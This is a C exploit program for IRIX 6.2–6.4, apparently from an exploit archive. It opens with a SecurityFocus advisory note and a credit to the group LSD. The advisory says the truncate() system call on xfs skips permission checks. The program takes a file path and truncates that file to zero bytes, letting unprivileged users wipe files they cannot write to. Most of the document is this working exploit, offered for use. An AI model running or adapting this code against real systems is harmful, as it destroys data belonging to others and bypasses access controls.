/*
source: http://www.securityfocus.com/bid/1540/info

The truncate() system call on a number of versions of the IRIX operating system (with the xfs file system) does not properly check permissions before truncating a file, making it possible for unprivileged users to damage files to which they would otherwise not have write access. Although only versions 6.2, 6.3, and 6.4 are listed as vulnerable other versions may exhibit this behaviour as well. 
*/

/*## copyright LAST STAGE OF DELIRIUM feb 1997 poland        *://lsd-pl.net/ #*/
/*## truncate                                                                #*/

/*   truncates any file on a xfs filesystem                                   */

main(int argc,char **argv){
    printf("copyright LAST STAGE OF DELIRIUM feb 1997 poland   //lsd-pl.net\n");
    printf("truncate for irix 6.2 6.3 6.4 IP:all\n\n");

    if(argc!=2){
        printf("usage: %s file\n",argv[0]);
        exit(-1);
    }

    if(!truncate(argv[1],0)) printf("file %s truncated\n",argv[1]);
    else perror("error");
}